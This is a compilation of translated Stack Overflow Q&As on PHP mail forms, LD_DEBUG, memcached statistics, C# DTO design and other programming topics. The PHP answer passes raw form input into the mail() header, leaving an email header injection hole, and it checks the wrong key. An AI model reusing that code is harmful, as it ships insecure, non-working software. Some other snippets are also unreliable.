# php - 邮件在php中发送文件

> ID：15110973
> 
> 赞同：0
> 
> 时间：2013-02-27T11:29:07.817
> 
> 标签：php, email

我想在 php 中创建邮件表单。我为 ny 表单编写 html 代码。我将 html 表单和 php 代码编写在同一个文件中。所以我不想使用另一个文件发送电子邮件。

```
 <div class="agent-contact">
      <table width="400" border="0" align="center" cellpadding="3" cellspacing="1">
      <tr>
      <td><strong>Contact Form </strong></td>
      </tr>
      </table>

      <table width="400" border="0" align="center" cellpadding="0" cellspacing="1">
        <tr>
          <td>
            <form name="form1" method="post" action="">
              <table width="100%" border="0" cellspacing="1" cellpadding="3">
                <tr>
                  <td width="16%">Subject</td>
                  <td width="2%">:</td>
                  <td width="82%"><input name="subject" type="text" id="subject" size="50"></td>
                </tr>
                <tr>
                  <td>Detail</td>
                  <td>:</td>
                  <td><textarea name="detail" cols="50" rows="4" id="detail"></textarea></td>
                </tr>
                <tr>
                  <td>Name</td>
                  <td>:</td>
                  <td><input name="name" type="text" id="name" size="50"></td>
                </tr>
                <tr>
                  <td>Email</td>
                  <td>:</td>
                  <td><input name="customer_mail" type="text" id="customer_mail" size="50"></td>
                </tr>
                <tr>
                  <td>&nbsp;</td>
                  <td>&nbsp;</td>
                  <td><input type="submit" name="Submit" value="Send Message"></td>
                </tr>
              </table>
            </form>
          </td>
        </tr>
      </table>
  </div> 
```

我发送邮件的 php 代码是

```
<?php

$subject ="$subject";

$message="$detail";

$mail_from="$customer_mail";

$header="from: $name <$mail_from>";

$to ='someone@somewhere.com';

$send_contact=mail($to,$subject,$message,$header);

if($send_contact){
echo "We've recived your contact information";
}
else {
echo "ERROffR";
} 
```

?>

提交发送消息按钮时如何发送邮件？我有相同的文件。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-27T11:33:11.360

采用`isset`

```
if($_POST['submit']) {
  $subject =$_POST['subject'];

  $message=$_POST['detail'];

  $mail_from=$_POST['customer_mail'];

  $header="from: " . $_POST['name'] ." <$mail_from>";

  $to ='someone@somewhere.com';

  $send_contact=mail($to,$subject,$message,$header);

  if($send_contact){
    echo "We've recived your contact information";
  }
  else {
     echo "ERROffR";
  }
 } 
```

# c++ - LD_DEBUG 输出中的“调用 init：”是什么？

> ID：15110974
> 
> 赞同：0
> 
> 时间：2013-02-27T11:29:10.743
> 
> 标签：c++, ld

我正在使用 c++，我使用 LD_DEBUG 环境变量来获取库加载顺序，如下所示：

```
export LD_DEBUG=libs 
```

然后执行程序。以下是输出的片段。

```
|       3652:   find library=libc.so.6 [0]; searching
|       3652:    search cache=/etc/ld.so.cache
|       3652:     trying file=/lib/i386-linux-gnu/i686/cmov/libc.so.6
|       3652:   
|       3652:   
|       3652:   calling init: /lib/i386-linux-gnu/i686/cmov/libc.so.6
|       3652:   calling init: /lib/i386-linux-gnu/mySo.so.1 
```

有人告诉我，上述输出语句中“调用init”是什么意思？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-27T11:31:41.350

`calling init`表示任何初始化函数（例如`__attribute__((constructor))`，静态初始化程序和其他设置函数）都在该库中被调用。

# python - 如何在 *nix 中的“top”命令的输出中获取完整的用户名？

> ID：15110982
> 
> 赞同：0
> 
> 时间：2013-02-27T11:29:43.080
> 
> 标签：python, unix

我需要从我监控的几个 *nix 系统上的 top 命令中提取进程详细信息。所需的详细信息是用户名、执行的命令、PID、PPID、用户名和常驻内存消耗。

**如果内存使用量大于阈值或命令非法，我需要通过username@company.com**向用户发送警告

 **我正在编写一个脚本来在 python 中执行此操作，并通过执行“top -bc -n 1”和 grepping 命令关键字来获取所需的数据。但是，我还需要为非法进程提取用户名以发送邮件警告。

但是，top 会自动截断超过 8 个字符的用户名。如何检索完整的用户名？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-27T11:38:27.963

考虑使用`ps`代替，`top`因为我不知道为什么`top`会更好地完成这项任务。`ps`您可以比一个更灵活地配置输出`top`。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-27T11:39:48.410

使用用户 id，然后解析它以获取用户名：

```
getent passwd | grep <UID> | awk -F: '{ print $1; }' 
```

那，正如@wRAR 所说，使用`ps`而不是`top`.**

# iphone - 使用 Monotouch 在 iPhone 中播放 MJPEG 流

> ID：15110985
> 
> 赞同：2
> 
> 时间：2013-02-27T11:29:54.587
> 
> 标签：iphone, xamarin.ios, mjpeg

如何使用 Monotouch 在 iPhone 中播放 MJPEG 流？

首先我使用 webview 玩。在 iOS 5 中它正在播放，但在 iOS 6 和更高版本中，MJPEG 不在 webview 中播放。

我在 XCode 中找到了 Motion JPEG Image 视图。

[https://github.com/mateagar/Motion-JPEG-Image-View-for-iOS](https://github.com/mateagar/Motion-JPEG-Image-View-for-iOS)

我尝试将 Motion JPEG 图像视图转换为 Monotouch c#，但我不能。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-27T23:00:52.983

你试过只用`MPMoviePlayerViewController`吗？苹果文档[在这里](http://developer.apple.com/library/ios/documentation/mediaplayer/reference/mpmovieplayerviewcontroller_class/Reference/Reference.html)。

[我们用它在这个应用程序](https://itunes.apple.com/us/app/the-harlem-shake/id603351246?ls=1&mt=8)中播放本地视频文件，效果很好。

像这样使用它，确保它是“ViewController”而不是“Controller”：

```
var movieController = new MPMoviePlayerController(new NSUrl("http://yoururl.com/yourmovie.mp4"));
movieController.MoviePlayer.ShouldAutoplay = true;
movieController.MoviePlayer.SourceType = MPMovieSourceType.Streaming;
//Show the controller modally over top another controller
PresentViewController(movieController, true, null); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-11-18T17:50:10.513

使用 MJPEGClient 可以使用套接字播放 MJPEG 视频。我已经实现了参考以下示例[MJPEG](https://github.com/horsson/mjpeg-iphone) 如果有任何问题请联系我。

# objective-c - 在 cocoa 中持久化数组控制器的内容和顺序

> ID：15110987
> 
> 赞同：0
> 
> 时间：2013-02-27T11:30:09.017
> 
> 标签：objective-c, core-data, nsarraycontroller, macruby

我有一个 Mac OS 应用程序，它使用核心数据将其对象持久保存到磁盘，由 sqlite 支持。

我有一个 tableView 可以检查所有 NSManagedObject 子类。这绑定到一个 arrayController，该 arrayController 绑定到 managedObjectContext 中的一个实体。

使用这个 arrayController 中的对象，我加载了另一个 arrayController，它支持另一个 tableView，该 tableView 用于组织对象以准备导出到 tsv 文件。此 tableView 允许拖放以重新排序和删除条目 - 但这些都不会影响 managedObjectContext。

将第二个 arrayController 的内容持久保存到磁盘的最佳方法是什么，以便在重新打开文档时 tableView 具有与以前相同的顺序相同的对象？

到目前为止，我设法编写的只是向 managedObjects 添加一个名为secondaryArrayOrder 的属性，该属性在关闭文档时设置，或者如果从辅助arrayController 中删除对象，则设置为nil。虽然这会起作用，但似乎是错误的处理方法。

**编辑 - 添加了 MacRuby 标签，因为我现在已经使用该语言回答了我自己的问题。**

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-28T19:20:25.020

我现在想出了一个办法。

我没有在问题中提到该应用程序是 MacRuby 应用程序，因为它不相关，但我不相信我已将我的解决方案完美地翻译为 Objective-C，所以我将其保留为 MacRuby .

[每个 NSManagedObject 都有一个NSManagedObjectID](https://developer.apple.com/library/mac/#documentation/Cocoa/Reference/CoreDataFramework/Classes/NSManagedObjectID_Class/Reference/NSManagedObjectID.html)类的 objectID，它在应用程序中唯一标识它。例如，这些可以很容易地被查询并作为 plist 文件中的字符串保存到磁盘。

```
theObjects = arrayController.arrangedObjects
               .map { |e| e.objectID.URIRepresentation.absoluteString }

# save theObjects to disk as a plist or json. 
```

这可以用于在下次启动应用程序或打开文档时以相同的顺序重新创建数组控制器的内容：

```
def loadArrayController(arrayOfIDStrings)
  objects = arrayOfIDStrings.map { |e|
    url = NSURL.URLWithString(e)
    moID = managedObjectContext.persistentStoreCoordinator.managedObjectIDForURIRepresentation(url)
    managedObjectContext.objectWithID(moID)
  }
  arrayController.addObjects(objects)
  arrayController.setSelectedObjects([])
end 
```

# c# - 扩展基类以包含细节？

> ID：15110988
> 
> 赞同：2
> 
> 时间：2013-02-27T11:30:11.830
> 
> 标签：c#, oop, solid-principles

我的 DAL 返回了一个 DTO。例如

```
public class CustomerDTO
{
    public int CustId {get; set; }
    public int CustType {get; set; }
    .
    . 
    .
    public string GetCustomerTypes{
      get {  if (CustType== 1) 
               return "Special Customer";
             else if(CustType==
} 
```

现在我的类中有多个属性，它们没有与任何表链接，只是代表一些属性的代码，比如我可以拥有的 CustId（1='Special Customer'，2='Defaulter'or 3='New Customer'）。现在我需要在 DTO 上显示它们的属性。

我可以像上面所做的那样将我的业务逻辑嵌入到 SQL 语句或我的 DTO 类中。但是，对于各种列，我最终会得到很多条件逻辑。此外，如果我制作另一个 DTO，则会再次重复此条件逻辑。

如何将这个逻辑封装在我的类设计中并避免重复？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-27T11:40:38.840

如果某段逻辑重复了，你应该把它放在一个单独的方法中。该方法的位置取决于您的系统结构，但通常您有三个主要选项：

*   将逻辑放入辅助类
*   将逻辑放入基类
*   将逻辑放入扩展方法中

第一个选项是最简单的，并且需要最少的修改：只需添加一个带有静态方法的类，如下所示：

```
static class DtoHelper {
    public static string GetCustomerType(int type) {
        ... // Custom logic goes here
    }
} 
```

第二种方法最不灵活，因为它要求您的 DTO 继承一个公共类：

```
class WithCustomerType {
    private int custType;
    public string CustomerType {
        get {
            ... // Custom logic goes here
        }
    }
}
public class CustomerDTO : WithCustomerType {
    ...
} 
```

第三个选项更灵活，因为它使用接口而不是类型：

```
interface IWithRawCustomerType {
    int RawCustomerType {get;}
}
static class DtoExtensions {
    public static string GetCustomerType(this IWithRawCustomerType dto) {
        int type = dto.RawCustomerType;
        ...
    }
}
class CustomerDTO : IWithRawCustomerType {
    ...
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-27T11:35:29.410

您可以使类局部化并在局部类中编写额外的逻辑。如果它对所有 DTO 都是通用的，那么您可以将额外的逻辑放在基类中，并在您为 DTO 创建的所有分部类中继承它。

至于将类型“翻译”为字符串的问题，只需定义 Enum CustomerType 并在每个值的自定义属性中设置所需的文本。这样，您将拥有的通用逻辑将是返回您在每个实体中拥有的 Type 属性的 Attribute 值。

像这样：[从枚举属性获取枚举](https://stackoverflow.com/questions/2787506/cast-string-to-enum-with-enum-attribute)

因此，对于您的示例，我将定义一个枚举：

```
public enum CustomerType
{
[Tag("SpecialCustomer")]
SpecialCustomer = 1,
...
} 
```

然后在部分类中（如果实体是生成的代码），我会将默认成员包装到一个属性中，如下所示：

```
public string CustomerTypeAsString
{
 get
    { 
        return GetTagValue(CustType);
    }
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-02-27T11:36:11.827

我将建议您将这些值放入数据库中。您可以构建单独的表，例如：

```
CREATE TABLE CustomerTypes (
    ID INT PRIMARY KEY IDENTITY(1, 1),
    Name VARCHAR(50) NOT NULL
) 
```

或者您可以构建一个带有类型代码的表，例如：

```
CREATE TABLE ListTypes (
    ID INT PRIMARY KEY IDENTITY(1, 1),
    Name VARCHAR(50) NOT NULL,
    TypeCode CHAR(2) NOT NULL
) 
```

无论哪种方式，当您从数据库中收集 DTO 时，加入这些表并获取该值。因此，如果您构建了一张表，它可能看起来像：

```
SELECT c.*, ct.Name FROM Customer c
    JOIN CustomerTypes ct ON ct.ID = c.CustType 
```

如果您要使用带有类型代码的更通用的表，它可能如下所示：

```
SELECT c.*, lt.Name FROM Customer c
    JOIN ListTypes lt ON lt.ID = c.CustType AND lt.TypeCode = '01' 
```

* * *

这种方法对您如此有效的原因是您需要字符串值，但仅用于显示目的，并且您将在未来的许多类型中需要它。此外，您已经在数据库中获取实体，所以让数据库来完成这项工作。最后，如果您想在组合框中列出这些值并让用户选择它们，您可以从数据库中绑定该组合框，而不是静态绑定。

但简而言之，这使您的应用程序更容易修改和扩展。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-02-27T11:45:23.110

扩展方法呢

```
 public static  class DerivedValues
 {
     public static void ToCustomerTypes(this CustomerDTO dto)
     {
             if (dto.CustType == 1)
             dto.GetCustomerTypes = "Special Customer";
     }
 } 
```

主要用途

```
var c1 = new CustomerDTO();
        c1.ToCustomerTypes(); 
```

# c# - 如何将迷你图添加到 Windows 窗体应用程序？

> ID：15110993
> 
> 赞同：1
> 
> 时间：2013-02-27T11:30:28.283
> 
> 标签：c#, winforms, csv, sparklines

我有一个 c# 项目，我需要显示迷你图，其中的信息来自 .CSV 文件。我正在使用 Windows 表单应用程序，但我找不到任何可以使用的东西。我需要在彼此下方有很多迷你图。

我需要从 Windows 窗体更改吗？如果是这样的话？我不能把它作为一个网页。

我的教授给我们带来了这些网站：

*   [http://blog.jimmy.schementi.com/2011/05/sparklines-in-wpf-and-silverlight.html](http://blog.jimmy.schementi.com/2011/05/sparklines-in-wpf-and-silverlight.html)
*   [http://omnipotent.net/jquery.sparkline/#s-about](http://omnipotent.net/jquery.sparkline/#s-about)

PS我正在用c#写这个。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-27T12:06:02.813

您绝对应该学习使用 WPF，但是可以使用 winforms 标准控件实现迷你图。如果我错了，请纠正我，但迷你图是一个简单的折线图。

查看[图表控件](http://msdn.microsoft.com/en-us/library/system.windows.forms.datavisualization.charting.chart.aspx)的文档。您应该设置`ChartType`为`SeriesChartType.Spline`绘制迷你图。

**示例：**实现与链接的博文中类似的外观

```
var series = new Series("First")
                         {
                             ChartType = SeriesChartType.Spline, //line chart
                             ChartArea = "chartArea", 
                             Color = Color.White
                         };
//generating data
var random = new Random();
for (int i = 0; i < 50; i++)
{
    //random values
    series.Points.AddXY(i, random.Next(100));
}

//creating display area
var chartArea = new ChartArea("chartArea")
                            {
                                //hiding grid lines
                                AxisX =
                                    {
                                        LineWidth = 0,
                                        IntervalType = DateTimeIntervalType.NotSet,
                                        LabelStyle = {Enabled = false},
                                        MajorGrid = {LineWidth = 0},
                                        MajorTickMark = {LineWidth = 0}
                                    },
                                AxisY =
                                    {
                                        LineWidth = 0,
                                        LabelStyle = {Enabled = false},
                                        MajorGrid = {LineWidth = 0},
                                        MajorTickMark = {LineWidth = 0}
                                    },
                                BackColor = Color.Black
                            };

//creating chart control
var chart = new Chart {Dock = DockStyle.Fill, BackColor = Color.Black};
chart.ChartAreas.Add(chartArea);
chart.Series.Add(series);

//add chart control to form
Controls.Add(chart); 
```

结果是：

![在此处输入图像描述](../Images/f7543c26405d12e27e06819f0f1dac6b.png)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-27T11:42:24.523

您的教授建议的第一个站点可以使用不基于 Web 的 WPF。

我可以建议您查看[MSDN-WPF](http://msdn.microsoft.com/en-us//library/ms754130.aspx)，然后转到[建议的站点](http://blog.jimmy.schementi.com/2011/05/sparklines-in-wpf-and-silverlight.html)吗？

# php - 如何使用 php 在事务中执行文件系统操作？

> ID：15110996
> 
> 赞同：10
> 
> 时间：2013-02-27T11:30:45.913
> 
> 标签：php, file, filesystems

我正在寻找使用带有事务支持的 php 来实现文件系统操作的方法。就像我在事务中执行移动、复制和删除等操作一样，如果其中一个操作失败，脚本需要恢复所有已经执行的操作。我有点无能为力，正在寻求指导如何实现它。如果存在可用的库或解决方案？如果问题听起来含糊不清，我深表歉意。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-02-27T15:51:19.257

最常见的模式是将所有内容复制到其他地方，对副本进行操作并在一切正常时替换原件。

有些东西告诉我 PHP 流包装器也可能对此有用。可以覆盖“file://”协议并在虚拟文件系统中运行（概念证明：[https](https://github.com/Respect/Test#streamwrapper) ://github.com/Respect/Test#streamwrapper ）。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-02-27T15:45:39.187

文件系统——与数据库管理系统相比——不支持事务。但是，有些确实提供了实现交易所需的东西；那就是锁定和记录。日志不会成为您的问题，因为您也可以在 php 中完成，但您需要一个提供文件锁的文件系统。

我建议你不要自己实现这样的东西——你可能会遇到很多问题。数据库人员在这里回顾了几十年的研究历史。

但是，如果必须，您可以（首先）在 php.ini 中实现[两阶段锁定之](http://en.wikipedia.org/wiki/Two-phase_locking)类的东西。此外，您可能会考虑使用[命令模式](http://gamedev.tutsplus.com/tutorials/implementation/let-your-players-undo-their-in-game-mistakes-with-the-command-pattern/)，这有助于为您的回滚提供撤消功能。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2013-02-27T15:51:12.377

一种选择是考虑将文件存储为数据库中的 BLOB，而不是文件。这些将支持事务以及数据库的所有其他功能。

可以在[ZFS](http://en.wikipedia.org/wiki/ZFS)等高级文件系统上支持事务，但不能直接使用 PHP，并且 Linux 默认情况下不安装 ZFS。

# memcached - Memcache 统计数据理解

> ID：15110999
> 
> 赞同：23
> 
> 时间：2013-02-27T11:31:01.737
> 
> 标签：memcached

Memcache telnet 接口有命令调用`STATS`，它显示很多数字，我在哪里可以看到它是什么意思？如何分析它们？多少缓存使用是有效的等等......

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2013-05-02T08:40:04.280

引用此博客文章中的信息：http: [//www.pal-blog.de/entwicklung/memcached/2011/memcached-statistics-stats-command.html](http://www.pal-blog.de/entwicklung/memcached/2011/memcached-statistics-stats-command.html)

```
Field   Sample value    Description
accepting_conns     1   The Memcached server is currently accepting new connections.
auth_cmds   0   Number of authentication commands processed by the server - if you use authentication within your installation. The default is IP (routing) level security which speeds up the actual Memcached usage by removing the authentication requirement.
auth_errors     0   Number of failed authentication tries of clients.
bytes   6775829     Number of bytes currently used for caching items, this server currently uses ~6 MB of it's maximum allowed (limit_maxbytes) 1 GB cache size.
bytes_read  880545081   Total number of bytes received from the network by this server.
bytes_written   3607442137  Total number of bytes send to the network by this server.
cas_badval  0   The "cas" command is some kind of Memcached's way to avoid locking. "cas" calls with bad identifier are counted in this stats key.
cas_hits    0   Number of successful "cas" commands.
cas_misses  0   "cas" calls fail if the value has been changed since it was requested from the cache. We're currently not using "cas" at all, so all three cas values are zero.
cmd_flush   0   The "flush_all" command clears the whole cache and shouldn't be used during normal operation.
cmd_get     1626823     Number of "get" commands received since server startup not counting if they were successful or not.
cmd_set     2279784     Number of "set" commands serviced since startup.
connection_structures   42  Number of internal connection handles currently held by the server. May be used as some kind of "maximum parallel connection count" but the server may destroy connection structures (don't know if he ever does) or prepare some without having actual connections for them (also don't know if he does). 42 maximum connections and 34 current connections (curr_connections) sounds reasonable, the live servers also have about 10% more connection_structures than curr_connections.
conn_yields     1   Memcached has a configurable maximum number of requests per event (-R command line argument), this counter shows the number of times any client hit this limit.
curr_connections    34  Number of open connections to this Memcached server, should be the same value on all servers during normal operation. This is something like the count of mySQL's "SHOW PROCESSLIST" result rows.
curr_items  30345   Number of items currently in this server's cache. The production system of this development environment holds more than 8 million items.
decr_hits   0   The "decr" command decreases a stored (integer) value by 1\. A "hit" is a "decr" call to an existing key.
decr_misses     0   "decr" command calls to undefined keys.
delete_hits     138707  Stored keys may be deleted using the "delete" command, this system doesn't delete cached data itself, but it's using the Memcached to avoid recaching-races and the race keys are deleted once the race is over and fresh content has been cached.
delete_misses   107095  Number of "delete" commands for keys not existing within the cache. These 107k failed deletes are deletions of non existent race keys (see above).
evictions   0   Number of objects removed from the cache to free up memory for new items because Memcached reached it's maximum memory setting (limit_maxbytes).
get_hits    391283  Number of successful "get" commands (cache hits) since startup, divide them by the "cmd_get" value to get the cache hitrate: This server was able to serve 24% of it's get requests from the cache, the live servers of this installation usually have more than 98% hits.
get_misses  1235540     Number of failed "get" requests because nothing was cached for this key or the cached value was too old.
incr_hits   0   Number of successful "incr" commands processed. "incr" is a replace adding 1 to the stored value and failing if no value is stored. This specific installation (currently) doesn't use incr/decr commands, so all their values are zero.
incr_misses     0   Number of failed "incr" commands (see incr_hits).
limit_maxbytes  1073741824  Maximum configured cache size (set on the command line while starting the memcached server), look at the "bytes" value for the actual usage.
listen_disabled_num     0   Number of denied connection attempts because memcached reached it's configured connection limit ("-c" command line argument).
pid     24040   Current process ID of the Memcached task.
pointer_size    64  Number of bits of the hostsystem, may show "32" instead of "64" if the running Memcached binary was compiled for 32 bit environments and is running on a 64 bit system.
reclaimed   14740   Numer of times a write command to the cached used memory from another expired key. These are not storage operations deleting old items due to a full cache.
rusage_system   310.030000  Number of system time seconds for this server process.
rusage_user     103.230000  Numer of user time seconds for this server process.
threads     4   Number of threads used by the current Memcached server process.
time    1323008181  Current unix timestamp of the Memcached's server.
total_connections   27384   Numer of successful connect attempts to this server since it has been started. Roughly $number_of_connections_per_task * $number_of_webserver_tasks * $number_of_webserver_restarts.
total_items     323615  Numer of items stored ever stored on this server. This is no "maximum item count" value but a counted increased by every new item stored in the cache.
uptime  1145873     Numer of seconds the Memcached server has been running since last restart.1145873 / (60 * 60 * 24) = ~13 days since this server has been restarted
version     1.4.5   Version number of the server 
```

* * *

## 回答 #2

> 赞同：13
> 
> 时间：2019-09-13T15:45:10.417

[可在https://github.com/memcached/memcached/blob/master/doc/protocol.txt](https://github.com/memcached/memcached/blob/master/doc/protocol.txt)找到为此的更新文档。

```
|-----------------------+---------+-------------------------------------------|
| Name                  | Type    | Meaning                                   |
|-----------------------+---------+-------------------------------------------|
| pid                   | 32u     | Process id of this server process         |
| uptime                | 32u     | Number of secs since the server started   |
| time                  | 32u     | current UNIX time according to the server |
| version               | string  | Version string of this server             |
| pointer_size          | 32      | Default size of pointers on the host OS   |
|                       |         | (generally 32 or 64)                      |
| rusage_user           | 32u.32u | Accumulated user time for this process    |
|                       |         | (seconds:microseconds)                    |
| rusage_system         | 32u.32u | Accumulated system time for this process  |
|                       |         | (seconds:microseconds)                    |
| curr_items            | 64u     | Current number of items stored            |
| total_items           | 64u     | Total number of items stored since        |
|                       |         | the server started                        |
| bytes                 | 64u     | Current number of bytes used              |
|                       |         | to store items                            |
| max_connections       | 32u     | Max number of simultaneous connections    |
| curr_connections      | 32u     | Number of open connections                |
| total_connections     | 32u     | Total number of connections opened since  |
|                       |         | the server started running                |
| rejected_connections  | 64u     | Conns rejected in maxconns_fast mode      |
| connection_structures | 32u     | Number of connection structures allocated |
|                       |         | by the server                             |
| reserved_fds          | 32u     | Number of misc fds used internally        |
| cmd_get               | 64u     | Cumulative number of retrieval reqs       |
| cmd_set               | 64u     | Cumulative number of storage reqs         |
| cmd_flush             | 64u     | Cumulative number of flush reqs           |
| cmd_touch             | 64u     | Cumulative number of touch reqs           |
| get_hits              | 64u     | Number of keys that have been requested   |
|                       |         | and found present                         |
| get_misses            | 64u     | Number of items that have been requested  |
|                       |         | and not found                             |
| get_expired           | 64u     | Number of items that have been requested  |
|                       |         | but had already expired.                  |
| get_flushed           | 64u     | Number of items that have been requested  |
|                       |         | but have been flushed via flush_all       |
| delete_misses         | 64u     | Number of deletions reqs for missing keys |
| delete_hits           | 64u     | Number of deletion reqs resulting in      |
|                       |         | an item being removed.                    |
| incr_misses           | 64u     | Number of incr reqs against missing keys. |
| incr_hits             | 64u     | Number of successful incr reqs.           |
| decr_misses           | 64u     | Number of decr reqs against missing keys. |
| decr_hits             | 64u     | Number of successful decr reqs.           |
| cas_misses            | 64u     | Number of CAS reqs against missing keys.  |
| cas_hits              | 64u     | Number of successful CAS reqs.            |
| cas_badval            | 64u     | Number of CAS reqs for which a key was    |
|                       |         | found, but the CAS value did not match.   |
| touch_hits            | 64u     | Number of keys that have been touched     |
|                       |         | with a new expiration time                |
| touch_misses          | 64u     | Number of items that have been touched    |
|                       |         | and not found                             |
| auth_cmds             | 64u     | Number of authentication commands         |
|                       |         | handled, success or failure.              |
| auth_errors           | 64u     | Number of failed authentications.         |
| idle_kicks            | 64u     | Number of connections closed due to       |
|                       |         | reaching their idle timeout.              |
| evictions             | 64u     | Number of valid items removed from cache  |
|                       |         | to free memory for new items              |
| reclaimed             | 64u     | Number of times an entry was stored using |
|                       |         | memory from an expired entry              |
| bytes_read            | 64u     | Total number of bytes read by this server |
|                       |         | from network                              |
| bytes_written         | 64u     | Total number of bytes sent by this server |
|                       |         | to network                                |
| limit_maxbytes        | size_t  | Number of bytes this server is allowed to |
|                       |         | use for storage.                          |
| accepting_conns       | bool    | Whether or not server is accepting conns  |
| listen_disabled_num   | 64u     | Number of times server has stopped        |
|                       |         | accepting new connections (maxconns).     |
| time_in_listen_disabled_us                                                  |
|                       | 64u     | Number of microseconds in maxconns.       |
| threads               | 32u     | Number of worker threads requested.       |
|                       |         | (see doc/threads.txt)                     |
| conn_yields           | 64u     | Number of times any connection yielded to |
|                       |         | another due to hitting the -R limit.      |
| hash_power_level      | 32u     | Current size multiplier for hash table    |
| hash_bytes            | 64u     | Bytes currently used by hash tables       |
| hash_is_expanding     | bool    | Indicates if the hash table is being      |
|                       |         | grown to a new size                       |
| expired_unfetched     | 64u     | Items pulled from LRU that were never     |
|                       |         | touched by get/incr/append/etc before     |
|                       |         | expiring                                  |
| evicted_unfetched     | 64u     | Items evicted from LRU that were never    |
|                       |         | touched by get/incr/append/etc.           |
| evicted_active        | 64u     | Items evicted from LRU that had been hit  |
|                       |         | recently but did not jump to top of LRU   |
| slab_reassign_running | bool    | If a slab page is being moved             |
| slabs_moved           | 64u     | Total slab pages moved                    |
| crawler_reclaimed     | 64u     | Total items freed by LRU Crawler          |
| crawler_items_checked | 64u     | Total items examined by LRU Crawler       |
| lrutail_reflocked     | 64u     | Times LRU tail was found with active ref. |
|                       |         | Items can be evicted to avoid OOM errors. |
| moves_to_cold         | 64u     | Items moved from HOT/WARM to COLD LRU's   |
| moves_to_warm         | 64u     | Items moved from COLD to WARM LRU         |
| moves_within_lru      | 64u     | Items reshuffled within HOT or WARM LRU's |
| direct_reclaims       | 64u     | Times worker threads had to directly      |
|                       |         | reclaim or evict items.                   |
| lru_crawler_starts    | 64u     | Times an LRU crawler was started          |
| lru_maintainer_juggles                                                      |
|                       | 64u     | Number of times the LRU bg thread woke up |
| slab_global_page_pool | 32u     | Slab pages returned to global pool for    |
|                       |         | reassignment to other slab classes.       |
| slab_reassign_rescues | 64u     | Items rescued from eviction in page move  |
| slab_reassign_evictions_nomem                                               |
|                       | 64u     | Valid items evicted during a page move    |
|                       |         | (due to no free memory in slab)           |
| slab_reassign_chunk_rescues                                                 |
|                       | 64u     | Individual sections of an item rescued    |
|                       |         | during a page move.                       |
| slab_reassign_inline_reclaim                                                |
|                       | 64u     | Internal stat counter for when the page   |
|                       |         | mover clears memory from the chunk        |
|                       |         | freelist when it wasn't expecting to.     |
| slab_reassign_busy_items                                                    |
|                       | 64u     | Items busy during page move, requiring a  |
|                       |         | retry before page can be moved.           |
| slab_reassign_busy_deletes                                                  |
|                       | 64u     | Items busy during page move, requiring    |
|                       |         | deletion before page can be moved.        |
| log_worker_dropped    | 64u     | Logs a worker never wrote due to full buf |
| log_worker_written    | 64u     | Logs written by a worker, to be picked up |
| log_watcher_skipped   | 64u     | Logs not sent to slow watchers.           |
| log_watcher_sent      | 64u     | Logs written to watchers.                 |
|-----------------------+---------+-------------------------------------------| 
```